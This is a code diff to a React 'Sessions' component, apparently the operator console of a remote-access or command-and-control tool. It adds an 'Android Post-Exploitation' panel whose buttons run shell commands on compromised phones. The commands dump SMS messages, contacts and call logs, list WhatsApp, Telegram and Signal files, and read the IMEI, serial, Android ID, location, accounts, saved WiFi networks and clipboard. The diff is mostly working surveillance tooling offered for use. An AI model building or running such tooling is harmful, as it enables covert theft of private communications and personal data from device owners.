@@ -279,22 +279,162 @@ export default function Sessions({ onOpenTerminal }: Props) {
                   </div>
                 </div>
 
-                {/* ── Execute panel ───────────────────────────────── */}
+                {/* ── Expanded panel ──────────────────────────────── */}
                 {isExp && (
                   <div className="border-t border-border/60 px-4 py-3 flex flex-col gap-3">
-                    {/* Quick commands */}
-                    <div>
-                      <label className="text-[10px] text-muted uppercase tracking-widest mb-2 block">Quick Commands</label>
-                      <div className="flex flex-wrap gap-1.5">
-                        {quick.map(q => (
-                          <button key={q.label} onClick={() => execute(s, q.cmd)} disabled={isExec}
-                            className="px-2.5 py-1 rounded text-[10px] border border-border text-muted hover:border-warn hover:text-warn transition-colors disabled:opacity-40 font-mono">
-                            {q.label}
-                          </button>
-                        ))}
+
+                    {/* ── Android capabilities panel ──────────────── */}
+                    {isAndroid && (
+                      <div className="flex flex-col gap-2">
+                        <label className="text-[10px] text-primary uppercase tracking-widest flex items-center gap-1">
+                          🤖 Android Post-Exploitation
+                        </label>
+
+                        {/* DEVICE */}
+                        <div>
+                          <div className="text-[9px] text-muted uppercase tracking-widest mb-1">📱 Device</div>
+                          <div className="flex flex-wrap gap-1">
+                            {[
+                              { l:'ID / User',   c:'id && whoami 2>/dev/null' },
+                              { l:'Kernel',       c:'uname -a' },
+                              { l:'CPU/HW',       c:'cat /proc/cpuinfo | grep -E "Hardware|model name|Processor" | head -5' },
+                              { l:'Memory',       c:'cat /proc/meminfo | head -10' },
+                              { l:'Battery',      c:'dumpsys battery 2>/dev/null | head -20' },
+                              { l:'Build Info',   c:'getprop ro.product.model && getprop ro.build.version.release && getprop ro.product.manufacturer' },
+                              { l:'IMEI',         c:'service call iphonesubinfo 1 2>/dev/null || echo no-access' },
+                              { l:'Serial',       c:'getprop ro.serialno 2>/dev/null || getprop ro.boot.serialno' },
+                            ].map(q => (
+                              <button key={q.l} onClick={() => execute(s, q.c)} disabled={isExec}
+                                className="px-2 py-1 rounded text-[9px] border border-border/70 text-muted hover:border-primary hover:text-primary transition-colors disabled:opacity-40">
+                                {q.l}
+                              </button>
+                            ))}
+                          </div>
+                        </div>
+
+                        {/* FILES */}
+                        <div>
+                          <div className="text-[9px] text-muted uppercase tracking-widest mb-1">📁 Files</div>
+                          <div className="flex flex-wrap gap-1">
+                            {[
+                              { l:'SD Card',      c:'ls -la /sdcard/' },
+                              { l:'Downloads',    c:'ls -la /sdcard/Download/' },
+                              { l:'DCIM',         c:'ls -laR /sdcard/DCIM/' },
+                              { l:'Documents',    c:'ls -la /sdcard/Documents/ 2>/dev/null' },
+                              { l:'WhatsApp',     c:'ls /sdcard/WhatsApp/Media/ 2>/dev/null || ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media/ 2>/dev/null || echo no-whatsapp' },
+                              { l:'Telegram',     c:'ls /sdcard/Telegram/ 2>/dev/null || echo no-telegram' },
+                              { l:'Signal',       c:'ls "/sdcard/Signal BackUp/" 2>/dev/null || echo no-signal' },
+                              { l:'Storage Info', c:'df -h /sdcard /data 2>/dev/null' },
+                            ].map(q => (
+                              <button key={q.l} onClick={() => execute(s, q.c)} disabled={isExec}
+                                className="px-2 py-1 rounded text-[9px] border border-border/70 text-muted hover:border-warn hover:text-warn transition-colors disabled:opacity-40">
+                                {q.l}
+                              </button>
+                            ))}
+                          </div>
+                        </div>
+
+                        {/* COMMUNICATIONS */}
+                        <div>
+                          <div className="text-[9px] text-muted uppercase tracking-widest mb-1">💬 Communications</div>
+                          <div className="flex flex-wrap gap-1">
+                            {[
+                              { l:'SMS Inbox',    c:"content query --uri content://sms/inbox --projection address:body:date 2>/dev/null | head -80 || echo 'permission-denied'" },
+                              { l:'SMS Sent',     c:"content query --uri content://sms/sent --projection address:body:date 2>/dev/null | head -80 || echo 'permission-denied'" },
+                              { l:'Contacts',     c:"content query --uri content://contacts/phones/ --projection display_name:number 2>/dev/null | head -100 || echo 'permission-denied'" },
+                              { l:'Call Log',     c:"content query --uri content://call_log/calls --projection number:date:type:duration 2>/dev/null | head -60 || echo 'permission-denied'" },
+                              { l:'All SMS',      c:"content query --uri content://sms --projection address:body:date:type 2>/dev/null | head -100 || echo 'permission-denied'" },
+                            ].map(q => (
+                              <button key={q.l} onClick={() => execute(s, q.c)} disabled={isExec}
+                                className="px-2 py-1 rounded text-[9px] border border-accent/50 text-accent hover:border-accent hover:bg-accent/10 transition-colors disabled:opacity-40">
+                                {q.l}
+                              </button>
+                            ))}
+                          </div>
+                        </div>
+
+                        {/* NETWORK */}
+                        <div>
+                          <div className="text-[9px] text-muted uppercase tracking-widest mb-1">🌐 Network</div>
+                          <div className="flex flex-wrap gap-1">
+                            {[
+                              { l:'WiFi Info',    c:"dumpsys wifi 2>/dev/null | grep -E 'mWifiInfo|SSID|IP address|DNS|bssid' | head -30 || ip addr" },
+                              { l:'WiFi History', c:"dumpsys wifi 2>/dev/null | grep -E 'savedNetworks|WifiConfiguration|SSID' | head -40" },
+                              { l:'IP Addr',      c:'ip addr show 2>/dev/null || cat /proc/net/if_inet6' },
+                              { l:'IP Route',     c:'ip route 2>/dev/null' },
+                              { l:'DNS',          c:"getprop net.dns1 && getprop net.dns2" },
+                              { l:'Connections',  c:'cat /proc/net/tcp6 2>/dev/null | head -30' },
+                            ].map(q => (
+                              <button key={q.l} onClick={() => execute(s, q.c)} disabled={isExec}
+                                className="px-2 py-1 rounded text-[9px] border border-border/70 text-muted hover:border-primary hover:text-primary transition-colors disabled:opacity-40">
+                                {q.l}
+                              </button>
+                            ))}
+                          </div>
+                        </div>
+
+                        {/* APPS */}
+                        <div>
+                          <div className="text-[9px] text-muted uppercase tracking-widest mb-1">📦 Apps</div>
+                          <div className="flex flex-wrap gap-1">
+                            {[
+                              { l:'User Apps',    c:'pm list packages -3 2>/dev/null' },
+                              { l:'All Apps',     c:'pm list packages 2>/dev/null' },
+                              { l:'App Paths',    c:'pm list packages -f -3 2>/dev/null | head -40' },
+                              { l:'Running Svcs', c:'dumpsys activity services 2>/dev/null | grep -E "^  \\*" | head -30' },
+                              { l:'Recent Apps',  c:'dumpsys activity recents 2>/dev/null | grep -E "Recent #[0-9]" | head -20' },
+                            ].map(q => (
+                              <button key={q.l} onClick={() => execute(s, q.c)} disabled={isExec}
+                                className="px-2 py-1 rounded text-[9px] border border-border/70 text-muted hover:border-warn hover:text-warn transition-colors disabled:opacity-40">
+                                {q.l}
+                              </button>
+                            ))}
+                          </div>
+                        </div>
+
+                        {/* RECON */}
+                        <div>
+                          <div className="text-[9px] text-muted uppercase tracking-widest mb-1">🔍 Recon & Persistence</div>
+                          <div className="flex flex-wrap gap-1">
+                            {[
+                              { l:'Accounts',     c:"dumpsys account 2>/dev/null | grep -E 'Account \\{|type=|name=' | head -40" },
+                              { l:'Android ID',   c:"settings get secure android_id 2>/dev/null" },
+                              { l:'Location',     c:"dumpsys location 2>/dev/null | grep -E 'Last Known|mLastLocation' | head -10" },
+                              { l:'Settings',     c:'settings list secure 2>/dev/null | head -40' },
+                              { l:'Clipboard',    c:'termux-clipboard-get 2>/dev/null || echo no-termux-api' },
+                              { l:'ENV vars',     c:'env' },
+                              { l:'Crontab',      c:'crontab -l 2>/dev/null || echo no-crontab' },
+                            ].map(q => (
+                              <button key={q.l} onClick={() => execute(s, q.c)} disabled={isExec}
+                                className="px-2 py-1 rounded text-[9px] border border-border/70 text-muted hover:border-danger hover:text-danger transition-colors disabled:opacity-40">
+                                {q.l}
+                              </button>
+                            ))}
+                          </div>
+                        </div>
+
+                        <div className="border-t border-border/40 pt-2">
+                          <label className="text-[10px] text-muted uppercase tracking-widest mb-2 block">Quick Commands (Android)</label>
+                        </div>
                       </div>
+                    )}
+
+                    {/* ── Quick commands (all OS) ───────────────────── */}
+                    {!isAndroid && (
+                      <div>
+                        <label className="text-[10px] text-muted uppercase tracking-widest mb-2 block">Quick Commands</label>
+                      </div>
+                    )}
+                    <div className="flex flex-wrap gap-1.5">
+                      {quick.map(q => (
+                        <button key={q.label} onClick={() => execute(s, q.cmd)} disabled={isExec}
+                          className="px-2.5 py-1 rounded text-[10px] border border-border text-muted hover:border-warn hover:text-warn transition-colors disabled:opacity-40 font-mono">
+                          {q.label}
+                        </button>
+                      ))}
                     </div>
-                    {/* Custom input */}
+
+                    {/* ── Custom input ─────────────────────────────── */}
                     <div className="flex gap-2">
                       <input value={customCmd[s.id] ?? ''} disabled={isExec}
                         onChange={e => setCustomCmd(p => ({ ...p, [s.id]: e.target.value }))}
@@ -307,7 +447,8 @@ export default function Sessions({ onOpenTerminal }: Props) {
                         {isExec ? <Loader size={13} className="animate-spin"/> : <Send size={13}/>}
                       </button>
                     </div>
-                    {/* Results */}
+
+                    {/* ── Results ──────────────────────────────────── */}
                     {myRes.map((r, i) => (
                       <div key={i} className="rounded border border-border/60 bg-bg">
                         <div className="flex items-center justify-between px-3 py-1.5 border-b border-border/40">
